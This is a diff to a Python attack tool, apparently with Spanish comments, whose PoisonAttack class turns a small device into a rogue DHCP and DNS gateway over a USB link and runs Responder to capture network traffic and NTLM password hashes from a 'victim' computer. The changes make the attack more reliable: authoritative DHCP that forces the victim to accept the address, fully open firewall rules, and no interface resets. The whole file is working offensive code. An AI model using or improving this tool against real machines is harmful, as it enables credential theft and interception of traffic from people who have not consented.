@@ -81,16 +81,12 @@ class PoisonAttack:
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
             time.sleep(1)
 
-            self.log("[*] Reset de interfaz y supresión IPv6/RA...")
+            # Preparar la interfaz UNA SOLA VEZ antes de los servicios
+            self.log("[*] Reset de interfaz...")
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
             time.sleep(1)
             os.system(f"sudo ip link set {iface} up")
-            time.sleep(2)
-
-            # Desactivar IPv6 para evitar esperas de SLAAC
-            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
-            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
-            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
+            time.sleep(1)
 
             ip = "192.168.10.1"
             subnet_mask = "24"
@@ -102,32 +98,29 @@ class PoisonAttack:
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
-            # ===== NUEVO: reglas de firewall para permitir DHCP =====
-            self.log("[*] Configurando firewall para DHCP...")
-            os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
-            os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
-            os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
-            os.system(f"sudo ip6tables -A INPUT -i {iface} -p icmpv6 -j ACCEPT")
-            os.system(f"sudo ip6tables -A OUTPUT -o {iface} -p icmpv6 -j ACCEPT")
-            # ======================================================
+            # REGLA MAESTRA: Permitir TODO el tráfico en la interfaz USB
+            # Esto es vital para que Linux no desconecte la red al fallar los pings de comprobación
+            self.log("[*] Configurando firewall para Responder y DHCP...")
+            os.system(f"sudo iptables -A INPUT -i {iface} -j ACCEPT")
+            os.system(f"sudo iptables -A OUTPUT -o {iface} -j ACCEPT")
 
-            # Configuración dnsmasq (DHCP sin DNS)
-        
+            # Configuración dnsmasq (DHCP ultra-agresivo para Linux/Windows)
+            os.system("rm -f /tmp/dnsmasq.leases")
+            
             config_dhcp = (
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
-                f"dhcp-option=3,{ip}\n"
-                f"dhcp-option=6,{ip}\n"
+                f"dhcp-option=3,{ip}\n"        # Puerta de enlace (La Raspberry)
+                f"dhcp-option=6,{ip}\n"        # DNS (La Raspberry - Responder escuchará esto)
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
-                f"bind-dynamic\n"
-                f"dhcp-authoritative\n"     # <-- acelera la asignación DHCP
-                f"enable-ra\n"              # <-- activa Router Advertisements
-                f"dhcp-range=fd00::,ra-stateless,12h\n"   # <-- rango ULA para SLAAC
+                f"bind-dynamic\n"              # Fundamental para que no colapse si la red parpadea
+                f"dhcp-leasefile=/tmp/dnsmasq.leases\n"
+                f"dhcp-authoritative\n"        # Obliga a NetworkManager a aceptar la IP sin dudar
                 f"no-resolv\n"
                 f"no-hosts\n"
-                f"port=0\n"
+                f"port=0\n"                    # Apaga el DNS de dnsmasq para que Responder tome el puerto 53
                 f"log-dhcp\n"
             )
 
@@ -141,11 +134,10 @@ class PoisonAttack:
             )
             time.sleep(2)
 
-            # Verificar que dnsmasq esté corriendo
+            # Verificación de fallo en dnsmasq
             if self.dns_proc.poll() is not None:
                 err = self.dns_proc.stderr.read()
                 self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
-                self.log("[*] Reintentando en modo foreground...")
                 self.dns_proc = subprocess.Popen(
                     ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
@@ -153,7 +145,6 @@ class PoisonAttack:
             else:
                 self.log("[+] dnsmasq escuchando correctamente.")
 
-            # Detección de Responder
             responder_paths = [
                 "/usr/share/responder/Responder.py",
                 "/opt/Responder/Responder.py"
@@ -168,7 +159,6 @@ class PoisonAttack:
 
             self.log(f"[+] INTERFAZ LISTA: {iface}")
             self.log(f"[+] IP: {ip}/{subnet_mask}")
-            self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
             self.log(f"[+] Conecta ahora la víctima al puerto USB")
 
             self.proc_responder = subprocess.Popen(
@@ -178,14 +168,9 @@ class PoisonAttack:
                 text=True,
                 bufsize=1
             )
-            
-            os.system(f"sudo ip link set {iface} down 2>/dev/null")
-            time.sleep(0.5)
-            os.system(f"sudo ip link set {iface} up")
-            time.sleep(1)
-            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface} 2>/dev/null")
-            # ------------------------------------------
 
+            # ¡OJO AQUÍ! Hemos ELIMINADO el ciclo "down/up" que tiraba la red. 
+            # La interfaz ya está UP y con IP, lista para que la PC víctima despierte.
 
             while not self.stop_event.is_set():
                 linea = self.proc_responder.stdout.readline()
@@ -198,6 +183,7 @@ class PoisonAttack:
             self.log(f"\n[!] Error crítico: {e}")
         finally:
             self._cleanup()
+
 
     def _cleanup(self):
         self.log("\n[*] Deteniendo procesos y restaurando red...")
@@ -219,14 +205,14 @@ class PoisonAttack:
 
         os.system("sudo pkill -f responder > /dev/null 2>&1")
         os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
-        # Limpiar reglas de firewall
-        os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 67 -j ACCEPT 2>/dev/null")
-        os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
-        os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --sport 67 -j ACCEPT 2>/dev/null")
-        os.system(f"sudo ip6tables -D INPUT -i {self.interface} -p icmpv6 -j ACCEPT 2>/dev/null")
-        os.system(f"sudo ip6tables -D OUTPUT -o {self.interface} -p icmpv6 -j ACCEPT 2>/dev/null")
-        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
+        
+        # Limpiar las reglas globales de firewall que agregamos
+        os.system(f"sudo iptables -D INPUT -i {self.interface} -j ACCEPT 2>/dev/null")
+        os.system(f"sudo iptables -D OUTPUT -o {self.interface} -j ACCEPT 2>/dev/null")
+        
+        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
         os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
+        
         # Restaurar servicios detenidos
         os.system("sudo systemctl start systemd-resolved 2>/dev/null")
         os.system("sudo systemctl start systemd-networkd 2>/dev/null")
@@ -246,7 +232,8 @@ class PoisonAttack:
             subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)
 
         self.log("[+] Sistema restaurado. ¡Cacería finalizada!")
-
+    
+    
     def stop(self):
         self.stop_event.set()
         if self.proc_responder:
